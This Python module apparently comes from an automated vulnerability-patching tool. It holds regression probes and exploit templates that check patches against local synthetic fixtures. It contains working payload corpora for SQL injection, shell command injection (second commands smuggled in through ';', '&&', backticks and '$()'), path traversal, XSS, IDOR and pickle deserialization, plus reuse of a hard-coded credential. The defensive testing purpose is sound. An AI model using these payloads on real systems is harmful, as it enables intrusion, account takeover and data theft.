"""Regression suite + exploit harness as per-CWE templates.

Every probe here is parameterized by a scanner :class:`Finding` — its
``route``, ``method``, tainted ``param``, and ``sink`` — instead of
hardcoding endpoints (no ``/accounts/1002`` anywhere). The same template
covers every fixture that exhibits the CWE: e.g. the CWE-89 login template
confirms VulnBank's Flask login and ShopAPI's FastAPI login alike.

Demo fixture contracts the templates rely on (documented, synthetic only):

* fixtures seed the users ``alice`` / ``bob`` / ``admin`` (``-pw`` passwords);
* VulnBank-style handlers authenticate with ``Authorization: Bearer <id>``;
* every fixture exposes ``GET /health`` returning HTTP 200.

Both :mod:`patchproof.pipeline` and the verification gate import these, so
"proof" means the same thing everywhere. ``regression_suite`` and each
exploit accept either a Flask test client or a FastAPI/Starlette test
client; small adapters hide the response-API differences.
"""
from __future__ import annotations

import base64
import pickle as _pickle
import re
from collections.abc import Callable

from .models import CheckResult, ExploitResult, Finding

# --------------------------------------------------------------------------
# Client adapters (Flask vs FastAPI test clients)
# --------------------------------------------------------------------------

def _is_flask_client(client) -> bool:
    return type(client).__name__ == "FlaskClient"


def _http_get(client, route: str, params: dict | None = None,
              headers: dict | None = None):
    if _is_flask_client(client):
        return client.get(route, query_string=params or {},
                          headers=headers or {})
    return client.get(route, params=params or {}, headers=headers or {})


def _http_post(client, route: str, json: dict | None = None,
               headers: dict | None = None):
    # Both client styles accept ``json=`` and ``headers=``.
    return client.post(route, json=json or {}, headers=headers or {})


def _status(resp) -> int:
    return resp.status_code


def _json(resp) -> dict:
    if hasattr(resp, "get_json"):
        return resp.get_json() or {}
    try:
        data = resp.json()
    except Exception:
        return {}
    return data if isinstance(data, dict) else {}


def _text(resp) -> str:
    if hasattr(resp, "get_data"):
        return resp.get_data(as_text=True)
    return getattr(resp, "text", "") or ""


def _fill_route(route: str, value) -> str:
    """Substitute one path placeholder in either framework's style."""
    filled = re.sub(r"<[^>]+>", str(value), route)    # Flask <int:id>
    filled = re.sub(r"\{[^{}]+\}", str(value), filled)  # FastAPI {id}
    return filled


def _as_finding(finding: Finding | dict) -> Finding:
    return Finding.from_dict(finding) if isinstance(finding, dict) else finding


def _shape(finding: Finding, method: str | None = None) -> Finding:
    """Fail closed when a template cannot be parameterized by the finding."""
    if not finding.route:
        raise ValueError(
            f"exploit template for {finding.rule_id}: finding carries no route")
    if method is not None and finding.method.upper() != method:
        raise ValueError(
            f"exploit template for {finding.rule_id}: unsupported method "
            f"{finding.method!r} (needs {method})")
    return finding


# Attack payload constants (payloads, not endpoints — the route always comes
# from the finding). Markers are synthetic and only ever sent to the local
# fixture under test.
_SQLI_PROBE = "admin' --"
_CMDI_MARKER = "PWNED_BY_PATCHPROOF"
_TRAVERSAL_PROBE = "../vault_secret.txt"
_TRAVERSAL_MARKER = "SYNTHETIC_SECRET"
_XSS_PROBE = "<script>alert(document.cookie)</script>"
_PICKLE_MARKER = "PWNED_BY_PICKLE_502"

#: Demo identity space the IDOR template searches (fixture contract: VulnBank
#: seeds accounts 1001+, Bearer user-id auth). The route comes from the
#: finding; these bounds only say where to look for "self" vs "other".
_IDOR_OBJECT_IDS = range(1001, 1011)
_IDOR_CALLER_UID = "1"
_AUTH_BEARER_1 = {"Authorization": "Bearer 1"}


class _PickleMarker:
    """Unpickles to the marker string via the `str` builtin only.

    The payload references no application class and executes no command, so
    it deserializes in any Python process — it only proves that untrusted
    bytes reach `pickle.loads`.
    """

    def __reduce__(self):  # noqa: D105 - pickle protocol hook
        return (str, (_PICKLE_MARKER,))


# --------------------------------------------------------------------------
# Regression: legitimate functionality that a patch must NOT break.
# Each probe is built from the finding's route/method/param.
# --------------------------------------------------------------------------

def probe_health(client, finding: Finding | dict | None = None) -> CheckResult:
    r = _http_get(client, "/health")
    return CheckResult("health_ok", _status(r) == 200,
                       f"status={_status(r)}")


def _probe_login(client, finding: Finding) -> list[CheckResult]:
    f = _shape(finding, "POST")
    param = f.param or "username"
    body = {"username": "alice", "password": "alice-pw"}
    if param not in body:
        body[param] = "alice"
    r = _http_post(client, f.route, json=body)
    data = _json(r)
    out = [CheckResult("valid_login_succeeds",
                       _status(r) == 200 and data.get("token") == "1",
                       f"status={_status(r)}")]
    r = _http_post(client, f.route,
                   json={"username": "alice", "password": "nope"})
    out.append(CheckResult("bad_password_rejected", _status(r) == 401,
                           f"status={_status(r)}"))
    return out


def _probe_idor_owner(client, finding: Finding) -> list[CheckResult]:
    f = _shape(finding, "GET")
    for oid in _IDOR_OBJECT_IDS:
        r = _http_get(client, _fill_route(f.route, oid),
                      headers=_AUTH_BEARER_1)
        if _status(r) == 200 and _json(r).get("owner_id") == 1:
            return [CheckResult("owner_reads_own_account", True,
                                f"status=200 id={oid}")]
    return [CheckResult("owner_reads_own_account", False,
                        "no self-owned object readable")]  # noqa: E501


def _probe_cmdi_legit(client, finding: Finding) -> list[CheckResult]:
    f = _shape(finding, "POST")
    param = f.param or "host"
    r = _http_post(client, f.route, json={param: "127.0.0.1"},
                   headers=_AUTH_BEARER_1)
    return [CheckResult("legit_ping_works", _status(r) == 200,
                        f"status={_status(r)}")]


def _probe_traversal_legit(client, finding: Finding) -> list[CheckResult]:
    f = _shape(finding, "GET")
    param = f.param or "name"
    r = _http_get(client, f.route, params={param: "welcome.txt"})
    ok = _status(r) == 200 and "public" in (_json(r).get("content", ""))
    return [CheckResult("public_file_readable", ok, f"status={_status(r)}")]


def _probe_xss_legit(client, finding: Finding) -> list[CheckResult]:
    f = _shape(finding, "GET")
    param = f.param or "name"
    r = _http_get(client, f.route, params={param: "Alice"})
    ok = _status(r) == 200 and "Hello Alice" in _text(r)
    return [CheckResult("greet_works", ok, f"status={_status(r)}")]


def _probe_pickle_legit(client, finding: Finding) -> list[CheckResult]:
    f = _shape(finding, "POST")
    doc = {"items": [{"sku": "WIDGET-1", "qty": 2}]}
    r = _http_post(client, f.route, json={"data": doc})
    data = _json(r)
    ok = _status(r) == 200 and data.get("imported") == 1
    results = [CheckResult("legit_import_works", ok, f"status={_status(r)}")]
    r = _http_post(client, f.route, json={"blob": "!!!not-base64!!!"})
    results.append(CheckResult("malformed_import_rejected",
                               _status(r) in (400, 422),
                               f"status={_status(r)}"))
    return results


def _probe_secret_denied(client, finding: Finding) -> list[CheckResult]:
    f = _shape(finding, "GET")
    param = f.param or "api_key"
    r = _http_get(client, f.route, params={param: "wrong-key"})
    return [CheckResult("admin_denied_without_key",
                        _status(r) in (401, 403),
                        f"status={_status(r)}")]


#: Regression probes per CWE. A fixture runs the generic health probe plus the
#: probes for the CWEs its findings exhibit.
REGRESSION_TEMPLATES: dict[str, Callable] = {
    "CWE-89": _probe_login,
    "CWE-639": _probe_idor_owner,
    "CWE-78": _probe_cmdi_legit,
    "CWE-22": _probe_traversal_legit,
    "CWE-79": _probe_xss_legit,
    "CWE-502": _probe_pickle_legit,
    "CWE-798": _probe_secret_denied,
}


def regression_suite(client, findings: list[Finding | dict] | None = None
                     ) -> list[CheckResult]:
    """Legitimate behavior that must keep working, derived from findings.

    With no findings (generic caller), only the ``/health`` contract is
    checked. The pipeline and gate always pass the fixture's findings, so
    each CWE's legit counterpart is exercised before and after every patch.
    """
    out: list[CheckResult] = [probe_health(client)]
    # One probe per CWE, parameterized by the REAL handler when the fixture
    # carries both a planted vuln and an Item-2 `-decoy` look-alike of the
    # same CWE: the decoy needs no regression (it is never patched), and its
    # route does not serve the legit-behavior contract the probe checks.
    # A CWE seen only via decoys is skipped outright — there is no real
    # handler to regress (e.g. re-verifying an already-patched copy whose
    # real finding is gone but whose decoy remains).
    by_cwe: dict[str, list] = {}
    for item in findings or []:
        finding = _as_finding(item)
        by_cwe.setdefault(finding.cwe, []).append(finding)
    for cwe in sorted(by_cwe):
        cands = by_cwe[cwe]
        real = [f for f in cands if not f.rule_id.endswith("-decoy")]
        if not real:
            continue
        probe = REGRESSION_TEMPLATES.get(cwe)
        if probe is None:
            continue
        out.extend(probe(client, real[0]))
    return out


# --------------------------------------------------------------------------
# Exploits: each returns exploited=True if the attack succeeded.
# --------------------------------------------------------------------------

def _exploit_cwe89(client, finding: Finding,
                   payload: str | None = None) -> ExploitResult:
    # Comment out the password check and authenticate as admin.
    f = _shape(finding, "POST")
    param = f.param or "username"
    probe = payload if payload is not None else _SQLI_PROBE
    body = {"username": "alice", "password": "wrong-on-purpose"}
    body[param] = probe
    r = _http_post(client, f.route, json=body)
    data = _json(r)
    exploited = _status(r) == 200 and data.get("role") == "admin"
    return ExploitResult(
        exploited,
        f"POST {f.route} {{{param}: {probe!r}}} -> {_status(r)} {data}. "
        f"{'Authenticated as admin without the password.' if exploited else 'Blocked.'}",
    )


def _exploit_cwe639(client, finding: Finding,
                   object_id: int | str | None = None) -> ExploitResult:
    # Read another user's object: scan the demo id space for any record whose
    # owner is not the caller (or test one pinned id when given).
    f = _shape(finding, "GET")
    if object_id is not None:
        r = _http_get(client, _fill_route(f.route, object_id),
                      headers=_AUTH_BEARER_1)
        body = _json(r)
        owner = body.get("owner_id")
        exploited = (_status(r) == 200 and owner is not None
                     and str(owner) != _IDOR_CALLER_UID)
        detail = (f"id {object_id} owned by {owner}"
                  if exploited else f"id {object_id} -> {_status(r)}")
        return ExploitResult(
            exploited,
            f"GET {_fill_route(f.route, object_id)} as user {_IDOR_CALLER_UID} "
            f"-> {detail}. "
            f"{'Read another users object.' if exploited else 'Access denied.'}",
        )
    own: int | None = None
    victim: tuple[int, dict] | None = None
    for oid in _IDOR_OBJECT_IDS:
        r = _http_get(client, _fill_route(f.route, oid),
                      headers=_AUTH_BEARER_1)
        if _status(r) != 200:
            continue
        body = _json(r)
        owner = body.get("owner_id")
        if owner == 1 and own is None:
            own = oid
        elif owner is not None and str(owner) != _IDOR_CALLER_UID:
            victim = (oid, body)
            break
    exploited = victim is not None
    detail = (f"id {victim[0]} owned by {victim[1].get('owner_id')}"
              if victim else f"only id {own} readable")
    return ExploitResult(
        exploited,
        f"GET {f.route} as user {_IDOR_CALLER_UID} -> {detail}. "
        f"{'Read another users object.' if exploited else 'Access denied.'}",
    )


def _exploit_cwe78(client, finding: Finding,
                   payload: str | None = None) -> ExploitResult:
    # Inject a second command via a shell metacharacter.
    f = _shape(finding, "POST")
    param = f.param or "host"
    if payload is None:
        payload = f"127.0.0.1; echo {_CMDI_MARKER}"
    r = _http_post(client, f.route, json={param: payload},
                   headers=_AUTH_BEARER_1)
    data = _json(r)
    exploited = _CMDI_MARKER in (data.get("output", "") or "")
    return ExploitResult(
        exploited,
        f"POST {f.route} {{{param}: {payload!r}}} -> injected command "
        f"{'executed (output contained the marker).' if exploited else 'did not run.'}",
    )


def _exploit_cwe22(client, finding: Finding,
                   payload: str | None = None) -> ExploitResult:
    # Escape the docs directory to read the sibling secret file.
    f = _shape(finding, "GET")
    param = f.param or "name"
    probe = payload if payload is not None else _TRAVERSAL_PROBE
    r = _http_get(client, f.route, params={param: probe})
    data = _json(r)
    exploited = _status(r) == 200 and _TRAVERSAL_MARKER in data.get("content", "")
    return ExploitResult(
        exploited,
        f"GET {f.route}?{param}={probe} -> {_status(r)}. "
        f"{'Leaked a file outside the docs directory.' if exploited else 'Blocked.'}",
    )


def _exploit_cwe79(client, finding: Finding,
                   payload: str | None = None) -> ExploitResult:
    # Reflected payload returned unescaped = executable in a browser.
    f = _shape(finding, "GET")
    param = f.param or "name"
    probe = payload if payload is not None else _XSS_PROBE
    r = _http_get(client, f.route, params={param: probe})
    text = _text(r)
    exploited = probe in text          # raw, unescaped reflection
    return ExploitResult(
        exploited,
        f"GET {f.route}?{param}={probe} -> payload "
        f"{'reflected unescaped (executes in a browser).' if exploited else 'was escaped.'}",
    )


def _exploit_cwe502(client, finding: Finding,
                   blob: str | None = None) -> ExploitResult:
    # A crafted pickle that deserializes to the marker string (builtins only:
    # no shell, no imports) proves untrusted bytes reach pickle.loads.
    f = _shape(finding, "POST")
    param = f.param or "blob"
    if blob is None:
        blob = base64.b64encode(_pickle.dumps(_PickleMarker())).decode()
    r = _http_post(client, f.route, json={param: blob})
    text = _text(r)
    exploited = _PICKLE_MARKER in text
    return ExploitResult(
        exploited,
        f"POST {f.route} {{{param}: <crafted pickle>}} -> {_status(r)}. "
        f"{'Untrusted bytes were deserialized (marker reflected).' if exploited else 'Rejected.'}",
    )


def _exploit_cwe798(client, finding: Finding,
                   secret: str | None = None) -> ExploitResult:
    # The scanner records the hardcoded literal in the finding snippet; call
    # the endpoint with it. Success proves the source literal is a live key.
    f = _shape(finding, "GET")
    param = f.param or "api_key"
    if secret is None:
        candidates = re.findall(r'"([^"]{4,})"', f.snippet or "")
        candidates += re.findall(r"'([^']{4,})'", f.snippet or "")
        if not candidates:
            raise ValueError(
                f"exploit template for {f.rule_id}: no credential literal in "
                "finding.snippet")
        secret = candidates[0]
    r = _http_get(client, f.route, params={param: secret})
    data = _json(r)
    exploited = _status(r) == 200 and "error" not in data
    return ExploitResult(
        exploited,
        f"GET {f.route}?{param}=<hardcoded literal> -> {_status(r)} {data}. "
        f"{'Source literal is a live credential.' if exploited else 'Rejected.'}",
    )


#: Exploit templates per CWE, parameterized by the finding at call time.
EXPLOIT_TEMPLATES: dict[str, Callable] = {
    "CWE-89": _exploit_cwe89,
    "CWE-639": _exploit_cwe639,
    "CWE-78": _exploit_cwe78,
    "CWE-22": _exploit_cwe22,
    "CWE-79": _exploit_cwe79,
    "CWE-502": _exploit_cwe502,
    "CWE-798": _exploit_cwe798,
}


def exploit_for_finding(client, finding: Finding | dict) -> ExploitResult:
    """Run the CWE template for one finding against a test client."""
    resolved = _shape(_as_finding(finding))
    template = EXPLOIT_TEMPLATES.get(resolved.cwe)
    if template is None:
        raise KeyError(f"no exploit template registered for {resolved.cwe}")
    if resolved.variant:
        return exploit_variant(client, resolved, resolved.variant)
    return template(client, resolved)


# --------------------------------------------------------------------------
# Item-3 payload-variant corpus: every entry is replayed against each patched
# copy by the gate, which accepts a patch ONLY if ALL variants are blocked.
#
# SQLite/JSON shapes constrain the corpus (documented per CWE): only payloads
# that actually exploit the vulnerable baseline earn a place for that CWE —
# a variant that cannot exploit the baseline proves nothing about a patch.
# Encoded/double-encoded traversal and absolute-path exfiltration are
# therefore NOT listed: the fixtures single-decode JSON/query params and
# build docs_dir under a random temp dir, so those shapes fail even on the
# vulnerable app. The relative-depth family below covers the CWE-22 class.
# --------------------------------------------------------------------------

#: CWE-89: every payload must authenticate as admin on the vulnerable login
#: (bare tautologies return alice, a non-admin, so admin-pinned shapes only).
_SQLI_VARIANTS = [
    ("comment-space", "admin' --"),
    ("comment-nospace", "admin'--"),
    ("comment-trailing-space", "admin' -- "),
    ("comment-inline-block", "admin'/**/--"),
    ("tautology-and", "admin' AND 1=1 --"),
    ("tautology-and-quoted", "admin' AND '1'='1' --"),
    ("tautology-and-alpha", "admin' AND 'a'='a' --"),
    ("or-username", "' OR username='admin' --"),
    ("union-admin", "' UNION SELECT 1,'a','b','admin' --"),
    ("union-admin-high-id", "' UNION SELECT 999,'x','y','admin' --"),
    ("union-all-admin", "' UNION ALL SELECT 3,'a','b','admin' --"),
    ("tautology-tab-comment", "admin'\t--"),
]

#: CWE-78: every payload must surface the marker via a shell metacharacter.
#: `{M}` is the marker, filled at use time so corpus and probe stay in sync.
_CMDI_VARIANTS = [
    ("semicolon", "127.0.0.1; echo {M}"),
    ("semicolon-nospace", "127.0.0.1;echo {M}"),
    ("and", "127.0.0.1 && echo {M}"),
    ("and-nospace", "127.0.0.1&&echo {M}"),
    ("pipe", "127.0.0.1 | echo {M}"),
    ("pipe-nospace", "127.0.0.1|echo {M}"),
    ("background", "127.0.0.1 & echo {M}"),
    ("dollar-paren", "$(echo {M})"),
    ("backticks", "`echo {M}`"),
    ("newline", "echo {M}\n127.0.0.1"),
    ("newline-dollar-paren", "$(echo {M})\n127.0.0.1"),
    ("short-host", "a;echo {M}"),
]

#: CWE-22: every payload must leak the sibling secret through open().
_TRAVERSAL_VARIANTS = [
    ("dotdot", "../vault_secret.txt"),
    ("dotdot-double-slash", "..//vault_secret.txt"),
    ("dotdot-dot", ".././vault_secret.txt"),
    ("dot-dotdot", "./../vault_secret.txt"),
    ("nested-one", "x/../../vault_secret.txt"),
    ("redundant-dir", "../docs/../vault_secret.txt"),
    ("single-letter", "a/../../vault_secret.txt"),
    ("nested-two", "a/b/../../../vault_secret.txt"),
    ("dot-nested", "./x/../../vault_secret.txt"),
    ("nested-two-deep", "sub1/sub2/../../../vault_secret.txt"),
]

#: CWE-79: every payload must reflect raw (XSS executes in a browser).
_XSS_VARIANTS = [
    ("script", "<script>alert(1)</script>"),
    ("img-onerror", "<img src=x onerror=alert(1)>"),
    ("svg-onload", "<svg onload=alert(1)>"),
    ("body-onload", "<body onload=alert(1)>"),
    ("anchor-javascript", "<a href=javascript:alert(1)>x</a>"),
    ("iframe-javascript", "<iframe src=javascript:alert(2)>"),
    ("div-onmouseover", "<div onmouseover=alert(1)>"),
    ("input-onfocus", "<input onfocus=alert(1) autofocus>"),
    ("details-ontoggle", "<details open ontoggle=alert(1)>"),
    ("video-source", "<video><source onerror=alert(1)>"),
    ("script-case", "<ScRiPt>alert(1)</ScRiPt>"),
    ("attr-breakout", '" onmouseover="alert(1)'),
    ("marquee", "<marquee onstart=alert(1)>"),
]

#: CWE-639: neighbouring/negative/missing ids. Only ids owned by someone
#: else exploit the baseline (1002 Bob, 1003 admin); the rest are recorded
#: anyway so the gate also pins that the patch rejects them.
_IDOR_VARIANTS = [
    ("neighbour-victim", 1002),
    ("neighbour-admin", 1003),
    ("own", 1001),
    ("missing-low", 999),
    ("zero", 0),
    ("negative", -1),
    ("far", 10000),
    ("missing", 1004),
]

#: CWE-798: derived from the literal the scanner recorded in the finding
#: snippet. Only the exact literal exploits the baseline; near-misses are
#: recorded so the gate pins that look-alikes stay rejected.
_SECRET_NEAR_MISSES = [" ", "  ", "\n", "x-wrong"]


def _pickle_variant_blobs() -> list[tuple[str, str]]:
    """Marker-deserializing blobs across pickle protocols and containers."""
    out: list[tuple[str, str]] = []
    for proto in range(6):
        raw = _pickle.dumps(_PickleMarker(), protocol=proto)
        out.append((f"pickle-proto-{proto}",
                    base64.b64encode(raw).decode()))
    out.append(("pickle-list", base64.b64encode(
        _pickle.dumps([_PICKLE_MARKER], protocol=4)).decode()))
    out.append(("pickle-dict", base64.b64encode(
        _pickle.dumps({"k": _PICKLE_MARKER}, protocol=4)).decode()))
    out.append(("pickle-tuple", base64.b64encode(
        _pickle.dumps((_PICKLE_MARKER, 7), protocol=2)).decode()))
    wrapped = base64.b64encode(_pickle.dumps(_PickleMarker())).decode()
    out.append(("pickle-b64-wrapped", wrapped[:40] + "\n" + wrapped[40:]))
    return out


def _secret_literal(finding: Finding) -> str:
    candidates = re.findall(r'"([^"]{4,})"', finding.snippet or "")
    candidates += re.findall(r"'([^']{4,})'", finding.snippet or "")
    if not candidates:
        raise ValueError(
            f"variant corpus for {finding.rule_id}: no credential literal in "
            "finding.snippet")
    return candidates[0]


def variant_payloads(finding: Finding | dict) -> list[tuple[str, str]]:
    """(label, payload) corpus for the finding's CWE, shared by both fixtures.

    Payloads are plain strings: for CWE-639 the object id as text, for
    CWE-502 a base64 blob, otherwise the raw attack input.
    """
    f = _as_finding(finding)
    if f.cwe == "CWE-89":
        return list(_SQLI_VARIANTS)
    if f.cwe == "CWE-78":
        return [(label, tmpl.format(M=_CMDI_MARKER))
                for label, tmpl in _CMDI_VARIANTS]
    if f.cwe == "CWE-22":
        return list(_TRAVERSAL_VARIANTS)
    if f.cwe == "CWE-79":
        return list(_XSS_VARIANTS)
    if f.cwe == "CWE-639":
        return [(label, str(oid)) for label, oid in _IDOR_VARIANTS]
    if f.cwe == "CWE-502":
        return _pickle_variant_blobs()
    if f.cwe == "CWE-798":
        literal = _secret_literal(f)
        near = [(f"near-miss-{i}", literal + suffix)
                for i, suffix in enumerate(_SECRET_NEAR_MISSES)]
        return [("exact-literal", literal)] + near + [
            ("uppercased", literal.upper()),
            ("truncated", literal[:-1]),
            ("empty", ""),
        ]
    raise KeyError(f"no variant corpus registered for {f.cwe}")


def exploit_variant(client, finding: Finding | dict,
                    payload: str) -> ExploitResult:
    """Run one corpus payload through the finding's CWE template."""
    f = _shape(_as_finding(finding))
    if f.cwe == "CWE-89":
        return _exploit_cwe89(client, f, payload)
    if f.cwe == "CWE-78":
        return _exploit_cwe78(client, f, payload)
    if f.cwe == "CWE-22":
        return _exploit_cwe22(client, f, payload)
    if f.cwe == "CWE-79":
        return _exploit_cwe79(client, f, payload)
    if f.cwe == "CWE-639":
        return _exploit_cwe639(client, f, int(payload))
    if f.cwe == "CWE-502":
        return _exploit_cwe502(client, f, payload)
    if f.cwe == "CWE-798":
        return _exploit_cwe798(client, f, payload)
    raise KeyError(f"no exploit template registered for {f.cwe}")
